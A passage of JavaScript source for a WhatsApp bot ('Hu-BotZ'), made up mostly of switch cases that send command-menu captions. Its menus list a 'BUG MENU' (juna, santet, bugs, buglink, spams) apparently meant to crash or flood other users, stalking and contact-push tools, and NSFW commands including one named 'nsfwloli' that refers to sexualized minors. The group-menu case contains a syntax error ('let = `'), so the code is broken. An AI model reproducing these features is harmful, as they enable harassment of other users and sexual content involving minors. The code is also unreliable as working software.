├• ${prefix}jualkambing [amount]
├• ${prefix}lebur [amount]
├• ${prefix}nebang
├• ${prefix}goplanet
│${petik}
├─────┈『 * GAME MENU* 』
│${petik}
├• ${prefix}akinator
├• ${prefix}caklontong
├• ${prefix}tebakgambar
├• ${prefix}tebakkata
├• ${prefix}tebakbendera
├• ${prefix}tebakkalimat
├• ${prefix}tebaksiapa
├• ${prefix}tebakkimia
├• ${prefix}tebaklirik
├• ${prefix}tebaktebakan
├• ${prefix}tekateki
├• ${prefix}susunkata
├• ${prefix}tictactoe
├• ${prefix}delttt
├• ${prefix}casino
├• ${prefix}delcasino
│${petik}
├─────┈『 *GROUP MENU* 』
│${petik}
├• ${prefix}autoaigc
├• ${prefix}afk
├• ${prefix}welcome
├• ${prefix}left
├• ${prefix}pppanjanggc
├• ${prefix}opentime
├• ${prefix}closetime
├• ${prefix}setopen
├• ${prefix}changesetopen
├• ${prefix}delsetopen
├• ${prefix}setclose
├• ${prefix}changesetclose
├• ${prefix}delsetclose
├• ${prefix}setwelcome
├• ${prefix}changewelcome
├• ${prefix}delsetwelcome
├• ${prefix}setleft
├• ${prefix}changeleft
├• ${prefix}delsetleft
├• ${prefix}linkgc
├• ${prefix}setppgc
├• ${prefix}setppgc2
├• ${prefix}setnamegc
├• ${prefix}setdesc
├• ${prefix}antilink
├• ${prefix}antilinktt
├• ${prefix}kickme
├• ${prefix}mute
├• ${prefix}open
├• ${prefix}close
├• ${prefix}kick
├• ${prefix}promote
├• ${prefix}demote
├• ${prefix}revoke
├• ${prefix}hidetag
├• ${prefix}checksewa
│${petik}
├─────┈『 *DOWNLOAD MENU* 』
│${petik}
├• ${prefix}play
├• ${prefix}ytmp3
├• ${prefix}ytmp4
├• ${prefix}ytv
├• ${prefix}ytv2
├• ${prefix}instagram
├• ${prefix}ig
├• ${prefix}ig2
├• ${prefix}ig3
├• ${prefix}igphoto
├• ${prefix}igvideo
├• ${prefix}igreels
├• ${prefix}twitter
├• ${prefix}tiktokvideo
├• ${prefix}tiktokslide
├• ${prefix}tiktoksearch
├• ${prefix}tiktokaudio
├• ${prefix}mediafire
├• ${prefix}gitclone
├• ${prefix}fbdl
├• ${prefix}gdrive
│${petik}
├─────┈『 *SEARCH MENU* 』
│${petik}
├• ${prefix}lk21
├• ${prefix}jarak
├• ${prefix}google
├• ${prefix}ytsearch
├• ${prefix}grupwa
├• ${prefix}pinterest
├• ${prefix}pixiv
├• ${prefix}lirik
├• ${prefix}infogempa
├• ${prefix}komikusearch
│${petik}
├─────┈『 *RANDOM MENU* 』
│${petik}
├• ${prefix}waifu
├• ${prefix}ppcp
├• ${prefix}cosplay
├• ${prefix}cecan
├• ${prefix}cogan
├• ${prefix}meme
├• ${prefix}memeindo
├• ${prefix}darkjokes
│${petik}
├─────┈『 *RANDOM QUOTES* 』
│${petik}
├• ${prefix}quotesdilan
├• ${prefix}quotesbucin
├• ${prefix}quotesjawa
├• ${prefix}quotesanime
├• ${prefix}galau
│${petik}
├─────┈『 *RANDOM TEXT* 』
│${petik}
├• ${prefix}fakta
├• ${prefix}faktaunik
├• ${prefix}katabijak
├• ${prefix}motivasi
│${petik}
├─────┈『 *BALANCE MENU* 』
│${petik}
├• ${prefix}balance
├• ${prefix}limit
├• ${prefix}buylimit
├• ${prefix}buyglimit
├• ${prefix}transfer
├• ${prefix}toplocal
├• ${prefix}topglobal
│${petik}
├─────┈『 *OWNER MENU* 』
│${petik}
├• ${prefix}$/=>/>
├• ${prefix}pushkontak
├• ${prefix}self
├• ${prefix}public
├• ${prefix}setppbot
├• ${prefix}setppbot2
├• ${prefix}joingc
├• ${prefix}leavegc
├• ${prefix}broadcast
├• ${prefix}bcimg
├• ${prefix}bcstik
├• ${prefix}bcvn
├• ${prefix}bcvideo
├• ${prefix}bcsewa
├• ${prefix}addpremium
├• ${prefix}delpremium
├• ${prefix}addsewa
├• ${prefix}delsewa
├• ${prefix}blok
├• ${prefix}unblok
├• ${prefix}listblok
├• ${prefix}autoaipc
├• ${prefix}autoread
├• ${prefix}autobio
├• ${prefix}antidelete
├• ${prefix}antiviewonce
├• ${prefix}autorespond
├• ${prefix}anticall
├• ${prefix}autoblok212
├• ${prefix}resetlimit
├• ${prefix}getcase
├• ${prefix}delsampahsticker
├• ${prefix}delsesi
│${petik}
│${petik}
├─────┈『 *STORAGE MENU* 』
│${petik}
├• ${prefix}addstik
├• ${prefix}addvn
├• ${prefix}addimg
├• ${prefix}addvid
├• ${prefix}liststik
├• ${prefix}listvn
├• ${prefix}listimg
├• ${prefix}listvid
├• ${prefix}sampah
├• ${prefix}delsampah
├• ${prefix}sampah2
├• ${prefix}delsampah2
│${petik}
├─────┈『 *ASUPAN MENU* 』
│${petik}
├• ${prefix}asupan
├• ${prefix}bocil
├• ${prefix}santuy
├• ${prefix}ukhty
├• ${prefix}chika
├• ${prefix}delvira
├• ${prefix}ayu
├• ${prefix}bunga
├• ${prefix}aura
├• ${prefix}nisa
├• ${prefix}ziva
├• ${prefix}yana
├• ${prefix}viona
├• ${prefix}syania
├• ${prefix}riri
├• ${prefix}syifa
├• ${prefix}mama_gina
├• ${prefix}alcakenya
├• ${prefix}mangayutri
├• ${prefix}rikagusriani
├• ${prefix}geayubi
├• ${prefix}syifa
│${petik}
├─────┈『 *STALKING MENU* 』
│${petik}
├• ${prefix}igstalk
├• ${prefix}mlstalk
├• ${prefix}ffstalk
│${petik}
├─────┈『 *IMAGE EFFECT* 』
│${petik}
├• ${prefix}aiscene
├• ${prefix}remini
├• ${prefix}hdr
├• ${prefix}wasted
├• ${prefix}beautiful
├• ${prefix}fire
├• ${prefix}wanted
├• ${prefix}rip
├• ${prefix}jail
├• ${prefix}triggered
├• ${prefix}brazzers
├• ${prefix}gay
├• ${prefix}postig
│${petik}
├─────┈『 *FUN MENU* 』
│${petik}
├• ${prefix}apakah
├• ${prefix}kapankah
├• ${prefix}bisakah
├• ${prefix}bagaimanakah
├• ${prefix}rate
├• ${prefix}gantengcek
├• ${prefix}cekganteng
├• ${prefix}cantikcek
├• ${prefix}cekcantik
├• ${prefix}sangecek
├• ${prefix}ceksange
├• ${prefix}gaycek
├• ${prefix}cekgay
├• ${prefix}lesbicek
├• ${prefix}ceklesbi
├• ${prefix}wangy
│${petik}
├─────┈『 *BUG MENU* 』
│${petik}
├• ${prefix}juna
├• ${prefix}santet
├• ${prefix}bugs
├• ${prefix}buglink
├• ${prefix}spams
│${petik}
├─────┈『 *NSFW MENU* 』
│${petik}
├• ${prefix}hentai
├• ${prefix}gifhentai
├• ${prefix}gifblowjob
├• ${prefix}hentaivid
├• ${prefix}hneko
├• ${prefix}nwaifu
├• ${prefix}animespank
├• ${prefix}trap
├• ${prefix}gasm
├• ${prefix}ahegao
├• ${prefix}ass
├• ${prefix}bdsm
├• ${prefix}blowjob
├• ${prefix}cuckold
├• ${prefix}cum
├• ${prefix}milf
├• ${prefix}eba
├• ${prefix}ero
├• ${prefix}femdom
├• ${prefix}foot
├• ${prefix}gangbang
├• ${prefix}glasses
├• ${prefix}jahy
├• ${prefix}masturbation
├• ${prefix}manga
├• ${prefix}neko-hentai
├• ${prefix}neko-hentai2
├• ${prefix}nsfwloli
├• ${prefix}orgy
├• ${prefix}panties 
├• ${prefix}pussy
├• ${prefix}tentacles
├• ${prefix}thighs
├• ${prefix}yuri
├• ${prefix}zettai
├• ${prefix}xnxxsearch
├• ${prefix}xnxxdl
│${petik}
├─────┈『 *TEXTPRO MENU* 』
│${petik}
├• ${prefix}candy
├• ${prefix}christmas
├• ${prefix}3dchristmas
├• ${prefix}sparklechristmas
├• ${prefix}deepsea
├• ${prefix}scifi
├• ${prefix}rainbow
├• ${prefix}waterpipe
├• ${prefix}spooky
├• ${prefix}pencil
├• ${prefix}circuit
├• ${prefix}discovery
├• ${prefix}metalic
├• ${prefix}fiction
├• ${prefix}demon
├• ${prefix}transformer
├• ${prefix}berry
├• ${prefix}thunder
├• ${prefix}magma
├• ${prefix}3dstone
├• ${prefix}neonlight
├• ${prefix}glitch
├• ${prefix}harrypotter
├• ${prefix}brokenglass
├• ${prefix}papercut
├• ${prefix}watercolor
├• ${prefix}multicolor
├• ${prefix}neondevil
├• ${prefix}underwater
├• ${prefix}graffitibike
├• ${prefix}snow
├• ${prefix}cloud
├• ${prefix}honey
├• ${prefix}ice
├• ${prefix}fruitjuice
├• ${prefix}biscuit
├• ${prefix}wood
├• ${prefix}chocolate
├• ${prefix}strawberry
├• ${prefix}matrix
├• ${prefix}blood
├• ${prefix}dropwater
├• ${prefix}toxic
├• ${prefix}lava
├• ${prefix}rock
├• ${prefix}bloodglas
├• ${prefix}hallowen
├• ${prefix}darkgold
├• ${prefix}joker
├• ${prefix}wicker
├• ${prefix}firework
├• ${prefix}skeleton
├• ${prefix}blackpink
├• ${prefix}sand
├• ${prefix}glue
├• ${prefix}1917
├• ${prefix}leaves
├• ${prefix}retro
├• ${prefix}pornhub
├• ${prefix}8bit
├• ${prefix}batman
├• ${prefix}3dbox
├• ${prefix}lion
├• ${prefix}3davengers
├• ${prefix}window
├• ${prefix}3dspace
├• ${prefix}bokeh
├• ${prefix}holographic
├• ${prefix}thewall
├• ${prefix}carbon
├• ${prefix}whitebear
├• ${prefix}metallic
├• ${prefix}steel
├• ${prefix}fabric
├• ${prefix}ancient
├• ${prefix}marvel
│${petik}
├─────┈『 *PHOTOOXY MENU* 』
│${petik}
├• ${prefix}shadow 
├• ${prefix}write 
├• ${prefix}romantic 
├• ${prefix}burnpaper
├• ${prefix}smoke 
├• ${prefix}narutobanner 
├• ${prefix}love 
├• ${prefix}undergrass
├• ${prefix}doublelove 
├• ${prefix}coffecup
├• ${prefix}underwaterocean
├• ${prefix}smokyneon
├• ${prefix}starstext
├• ${prefix}rainboweffect
├• ${prefix}balloontext
├• ${prefix}metalliceffect
├• ${prefix}embroiderytext
├• ${prefix}flamingtext
├• ${prefix}stonetext
├• ${prefix}writeart
├• ${prefix}summertext
├• ${prefix}wolfmetaltext
├• ${prefix}nature3dtext
├• ${prefix}rosestext
├• ${prefix}naturetypography
├• ${prefix}quotesunder
├• ${prefix}shinetext
│${petik}
├─────┈『 *EPHOTO 360 MENU* 』
│${petik}
├• ${prefix}glitchtext
├• ${prefix}writetext
├• ${prefix}advancedglow
├• ${prefix}typographytext
├• ${prefix}pixelglitch
├• ${prefix}neonglitch
├• ${prefix}flagtext
├• ${prefix}flag3dtext
├• ${prefix}deletingtext
├• ${prefix}blackpinkstyle
├• ${prefix}glowingtext
├• ${prefix}underwatertext
├• ${prefix}logomaker
├• ${prefix}cartoonstyle
├• ${prefix}papercutstyle
├• ${prefix}watercolortext
├• ${prefix}effectclouds
├• ${prefix}blackpinklogo
├• ${prefix}gradienttext
├• ${prefix}summerbeach
├• ${prefix}luxurygold
├• ${prefix}multicoloredneon
├• ${prefix}sandsummer
├• ${prefix}galaxywallpaper
├• ${prefix}1917style
├• ${prefix}makingneon
├• ${prefix}royaltext
├• ${prefix}freecreate
├• ${prefix}galaxystyle
├• ${prefix}lighteffects
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'simplemenu':
case 'simpelmenu':
case 'menusimple':
case 'menusimpel':
case 'menu': {
let bijak = await fetchJson(`https://api.akuari.my.id/randomtext/katabijak`)
let author = bijak.hasil.author
let bijaknya = bijak.hasil.quotes
let translatedResponse = await translate(bijaknya, { to: 'en' });
let teks = bijaknya
    let capt = `
Hi 👋 *${pushname}*
*Good ${waktunya}*

🇺🇸 *Hu-BotZ Is a Multi Device WhatsApp Bot Based on Node.Js*,
To display all the menus in this bot, you can type *.allmenu* Or Type *.listmenu*

=> ${translatedResponse.text}
Ft. ${author}

🇮🇩 *Hu-BotZ Adalah Sebuah WhatsApp Bot Multi Device Berbasis Node.Js*,
Untuk Menampilkan Seluruh Menu Ketik *.allmenu* Atau Ketik *.listmenu*

=> ${bijaknya}
Ft. ${author}
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'listmenu':
case 'menulist': {
let capt = `
*This is the list of menu in this bot*
${readMore}
╭─────┈『 *LIST MENU* 』
│${petik}
├• ${prefix}allmenu
├• ${prefix}mainmenu
├• ${prefix}aimenu
├• ${prefix}convertmenu
├• ${prefix}anonymousmenu
├• ${prefix}rpgmenu
├• ${prefix}gamemenu
├• ${prefix}groupmenu
├• ${prefix}downloadmenu
├• ${prefix}searchmenu
├• ${prefix}randommenu
├• ${prefix}randomquotes
├• ${prefix}randomtext
├• ${prefix}balancemenu
├• ${prefix}ownermenu
├• ${prefix}storagemenu
├• ${prefix}asupanmenu
├• ${prefix}stalkingmenu
├• ${prefix}imageeffect
├• ${prefix}funmenu
├• ${prefix}nsfwmenu
├• ${prefix}textpromenu
├• ${prefix}photooxymenu
├• ${prefix}ephoto360menu
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'mainmenu':
case 'menumain': {
    let capt = `
*This is the main of menu in this bot*
${readMore}
╭─────┈『 *MAIN MENU* 』
│${petik}
├• ${prefix}allmenu
├• ${prefix}infobot
├• ${prefix}donate
├• ${prefix}dashboard
├• ${prefix}owner
├• ${prefix}cekdrive
├• ${prefix}cekbandwidth
├• ${prefix}cekpremium
├• ${prefix}listpremium
├• ${prefix}listsewa
├• ${prefix}speed
├• ${prefix}runtime
├• ${prefix}listbahasa
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'aimenu':
case 'menuai': {
    let capt = `
*This is the ai of menu in this bot*
${readMore}
╭─────┈『 *ARTIFICIAL INTELLIGENCE* 』
│${petik}
├• ${prefix}toanime
├• ${prefix}differentme
├• ${prefix}differentme2
├• ${prefix}stabblediffusion <prompt>
├• ${prefix}text2img <prompt>
├• ${prefix}text2imgv2 <prompt>
├• ${prefix}text2imgv3 <Models|Prompt>
├• ${prefix}bingimg <prompt>
├• ${prefix}bardimg <prompt>
├• ${prefix}aiscene
├• ${prefix}remini
├• ${prefix}hdr
├• ${prefix}ai GPT 3.5
├• ${prefix}aiv2 GPT-4 With Logic
├• ${prefix}bard [text]
├• ${prefix}bing [text]
├• ${prefix}kuncoro [text]
├• ${prefix}valrisk [text]
├• ${prefix}c-ai <Character|Text>
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'convertmenu':
case 'menuconvert': {
    let capt = `
*This is the convert of menu in this bot*
${readMore}
╭─────┈『 *CONVERTED MENU* 』
│${petik}
├• ${prefix}remini
├• ${prefix}hdr
├• ${prefix}nobg
├• ${prefix}removebg
├• ${prefix}resize
├• ${prefix}ssweb
├• ${prefix}sticker
├• ${prefix}stickerwm
├• ${prefix}smeme
├• ${prefix}toimg
├• ${prefix}tourl
├• ${prefix}tovideo
├• ${prefix}tomp3
├• ${prefix}toaudio
├• ${prefix}tovn
├• ${prefix}toptv
├• ${prefix}readvo
├• ${prefix}qc
├• ${prefix}emojimix
├• ${prefix}say
├• ${prefix}translate
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'anonymousmenu':
case 'menuanonymous': {
    let capt = `
*This is the anonymous of menu in this bot*
${readMore}
╭─────┈『 *ANONYMOUS MENU* 』
│${petik}
├• ${prefix}anonymouschat
├• ${prefix}start
├• ${prefix}next
├• ${prefix}stop
├• ${prefix}sendprofile
├• ${prefix}menfess
├• ${prefix}confess
├• ${prefix}balasmenfess
├• ${prefix}tolakmenfess
├• ${prefix}stopmenfess
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'rpgmenu':
case 'menurpg': {
   let capt = `
*This is the _Role Play Game_ of menu in this bot*
${readMore}
╭─────┈『 *RPG MENU* 』
│${petik}
├• ${prefix}inventory
├• ${prefix}claim/daily
├• ${prefix}weekly
├• ${prefix}monthly
├• ${prefix}mining
├• ${prefix}buy
├• ${prefix}craft <item> <count>
├• ${prefix}heal
├• ${prefix}hunt
├• ${prefix}adventure
├• ${prefix}luckyday
├• ${prefix}killslime
├• ${prefix}killgoblin
├• ${prefix}killdevil
├• ${prefix}killbehemoth
├• ${prefix}killdemon
├• ${prefix}killdemonking
├• ${prefix}joinrpg
├• ${prefix}sellikan
├• ${prefix}sellbesi
├• ${prefix}sellemas
├• ${prefix}jelajah
├• ${prefix}mancing
├• ${prefix}jualikan [amount]
├• ${prefix}jualcoal [amount]
├• ${prefix}jualstone [amount]
├• ${prefix}jualingot [amount]
├• ${prefix}jualkayu [amount]
├• ${prefix}jualbahankimia [amount]
├• ${prefix}jualkelinci [amount]
├• ${prefix}jualayam [amount]
├• ${prefix}jualsapi [amount]
├• ${prefix}jualdomba [amount]
├• ${prefix}jualgajah [amount]
├• ${prefix}jualkambing [amount]
├• ${prefix}lebur [amount]
├• ${prefix}nebang
├• ${prefix}goplanet
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'gamemenu':
case 'menugame': {
    let capt = `
*This is the _Game_ of menu in this bot*
${readMore}
╭─────┈『 *GAME MENU* 』
│${petik}
├• ${prefix}akinator
├• ${prefix}caklontong
├• ${prefix}tebakgambar
├• ${prefix}tebakkata
├• ${prefix}tebakbendera
├• ${prefix}tebakkalimat
├• ${prefix}tebaksiapa
├• ${prefix}tebakkimia
├• ${prefix}tebaklirik
├• ${prefix}tebaktebakan
├• ${prefix}tekateki
├• ${prefix}susunkata
├• ${prefix}tictactoe
├• ${prefix}delttt
├• ${prefix}casino
├• ${prefix}delcasino
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'groupmenu':
case 'grupmenu':
case 'menugroup':
case 'menugrup': {
    let = `
*This is the _Group_ of menu in this bot*
${readMore}
╭─────┈『 *GROUP MENU* 』
│${petik}
├• ${prefix}autoaigc
├• ${prefix}afk
├• ${prefix}welcome
├• ${prefix}left
├• ${prefix}pppanjanggc
├• ${prefix}opentime
├• ${prefix}closetime
├• ${prefix}setopen
├• ${prefix}changesetopen
├• ${prefix}delsetopen
├• ${prefix}setclose
├• ${prefix}changesetclose
├• ${prefix}delsetclose
├• ${prefix}setwelcome
├• ${prefix}changewelcome
├• ${prefix}delsetwelcome
├• ${prefix}setleft
├• ${prefix}changeleft
├• ${prefix}delsetleft
├• ${prefix}linkgc
├• ${prefix}setppgc
├• ${prefix}setppgc2
├• ${prefix}setnamegc
├• ${prefix}setdesc
├• ${prefix}antilink
├• ${prefix}antilinktt
├• ${prefix}kickme
├• ${prefix}mute
├• ${prefix}open
├• ${prefix}close
├• ${prefix}add
├• ${prefix}kick
├• ${prefix}promote
├• ${prefix}demote
├• ${prefix}revoke
├• ${prefix}hidetag
├• ${prefix}checksewa
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'downloadmenu':
case 'menudownload': {
    let capt = `
*This is the _Download_ of menu in this bot*
${readMore}
╭─────┈『 *DOWNLOAD MENU* 』
│${petik}
├• ${prefix}play
├• ${prefix}ytmp3
├• ${prefix}ytmp4
├• ${prefix}ytv
├• ${prefix}ytv2
├• ${prefix}instagram
├• ${prefix}ig
├• ${prefix}ig2
├• ${prefix}ig3
├• ${prefix}igphoto
├• ${prefix}igvideo
├• ${prefix}igreels
├• ${prefix}twitter
├• ${prefix}tiktokvideo
├• ${prefix}tiktokslide
├• ${prefix}tiktoksearch
├• ${prefix}tiktokaudio
├• ${prefix}mediafire
├• ${prefix}gitclone
├• ${prefix}fbdl
├• ${prefix}fb2
├• ${prefix}fb3
├• ${prefix}fb4
├• ${prefix}gdrive
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'searchmenu':
case 'menusearch': {
    let capt = `
*This is the _Search_ of menu in this bot*
${readMore}
╭─────┈『 *SEARCH MENU* 』
│${petik}
├• ${prefix}lk21
├• ${prefix}jarak
├• ${prefix}google
├• ${prefix}ytsearch
├• ${prefix}grupwa
├• ${prefix}pinterest
├• ${prefix}pixiv
├• ${prefix}lirik
├• ${prefix}infogempa
├• ${prefix}komikusearch
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'randommenu':
case 'menurandom': {
    let capt = `
*This is the _Random_ of menu in this bot*
${readMore}
╭─────┈『 *RANDOM MENU* 』
│${petik}
├• ${prefix}waifu
├• ${prefix}ppcp
├• ${prefix}cosplay
├• ${prefix}cecan
├• ${prefix}cogan
├• ${prefix}meme
├• ${prefix}memeindo
├• ${prefix}darkjokes
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'randomquotesmenu':
case 'menurandomquotes':
case 'randomquotes':
case 'quotesrandom': {
    let capt = `
*This is the _Qoutes_ of menu in this bot*
${readMore}
╭─────┈『 *RANDOM QUOTES* 』
│${petik}
├• ${prefix}quotesdilan
├• ${prefix}quotesbucin
├• ${prefix}quotesjawa
├• ${prefix}quotesanime
├• ${prefix}galau
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'randomtext':
case 'textrandom':
case 'menurandomtext':
case 'textrandommenu': {
    let capt = `
*This is the _Text Random_ of menu in this bot*
${readMore}
╭─────┈『 *RANDOM TEXT* 』
│${petik}
├• ${prefix}fakta
├• ${prefix}faktaunik
├• ${prefix}katabijak
├• ${prefix}motivasi
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'balancemenu':
case 'menubalance': {
    let capt = `
*This is the _Balance_ of menu in this bot*
${readMore}
╭─────┈『 *BALANCE MENU* 』
│${petik}
├• ${prefix}balance
├• ${prefix}limit
├• ${prefix}buylimit
├• ${prefix}buyglimit
├• ${prefix}transfer
├• ${prefix}toplocal
├• ${prefix}topglobal
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'ownermenu':
case 'menuowner': {
    let capt = `
*This is the _Owner_ of menu in this bot*
${readMore}
╭─────┈『 *OWNER MENU* 』
│${petik}
├• ${prefix}$/=>/>
├• ${prefix}pushkontak
├• ${prefix}self
├• ${prefix}public
├• ${prefix}setppbot
├• ${prefix}setppbot2
├• ${prefix}joingc
├• ${prefix}leavegc
├• ${prefix}broadcast
├• ${prefix}bcimg
├• ${prefix}bcstik
├• ${prefix}bcvn
├• ${prefix}bcvideo
├• ${prefix}bcsewa
├• ${prefix}addpremium
├• ${prefix}delpremium
├• ${prefix}addsewa
├• ${prefix}delsewa
├• ${prefix}blok
├• ${prefix}unblok
├• ${prefix}listblok
├• ${prefix}autoaipc
├• ${prefix}autoread
├• ${prefix}autobio
├• ${prefix}antidelete
├• ${prefix}antiviewonce
├• ${prefix}autorespond
├• ${prefix}anticall
├• ${prefix}autoblok212
├• ${prefix}resetlimit
├• ${prefix}getcase
├• ${prefix}delsampahsticker
├• ${prefix}delsesi
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'storagemenu':
case 'menustorage':
case 'penyimpananmenu':
case 'menupenyimpanan': {
    let capt = `
*This is the _Storage_ of menu in this bot*
${readMore}
╭─────┈『 *STORAGE MENU* 』
│${petik}
├• ${prefix}addstik
├• ${prefix}addvn
├• ${prefix}addimg
├• ${prefix}addvid
├• ${prefix}liststik
├• ${prefix}listvn
├• ${prefix}listimg
├• ${prefix}listvid
├• ${prefix}sampah
├• ${prefix}delsampah
├• ${prefix}sampah2
├• ${prefix}delsampah2
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'asupanmenu':
case 'menuasupan': {
    let capt = `
*This is the _Asupan_ of menu in this bot*
${readMore}
╭─────┈『 *ASUPAN MENU* 』
│${petik}
├• ${prefix}asupan
├• ${prefix}bocil
├• ${prefix}santuy
├• ${prefix}ukhty
├• ${prefix}chika
├• ${prefix}delvira
├• ${prefix}ayu
├• ${prefix}bunga
├• ${prefix}aura
├• ${prefix}nisa
├• ${prefix}ziva
├• ${prefix}yana
├• ${prefix}viona
├• ${prefix}syania
├• ${prefix}riri
├• ${prefix}syifa
├• ${prefix}mama_gina
├• ${prefix}alcakenya
├• ${prefix}mangayutri
├• ${prefix}rikagusriani
├• ${prefix}geayubi
├• ${prefix}syifa
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'stalkingmenu':
case 'menustalking':
case 'stalkermenu':
case 'menustalker': {
    let capt = `
*This is the _Stalker_ of menu in this bot*
${readMore}
╭─────┈『 *STALKING MENU* 』
│${petik}
├• ${prefix}igstalk
├• ${prefix}mlstalk
├• ${prefix}ffstalk
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'imageeffect':
case 'menuimageeffect':
case 'imageeffectmenu': {
    let capt = `
*This is the _Image Effect_ of menu in this bot*
${readMore}
╭─────┈『 *IMAGE EFFECT* 』
│${petik}
├• ${prefix}remini
├• ${prefix}hdr
├• ${prefix}wasted
├• ${prefix}beautiful
├• ${prefix}fire
├• ${prefix}wanted
├• ${prefix}rip
├• ${prefix}jail
├• ${prefix}triggered
├• ${prefix}brazzers
├• ${prefix}gay
├• ${prefix}postig
│${petik}
└─────────────────┈❍
`
await replyLoad5();
await HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/menu.mp4"),
caption: `${capt}`,
gifPlayback: true,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        }, { quoted: fkontak })
}
break
case 'funmenu':
case 'menufun': {
    let capt = `
*This is the _Fun_ of menu in this bot*
${readMore}
╭─────┈『 *FUN MENU* 』
│${petik}
├• ${prefix}apakah
├• ${prefix}kapankah
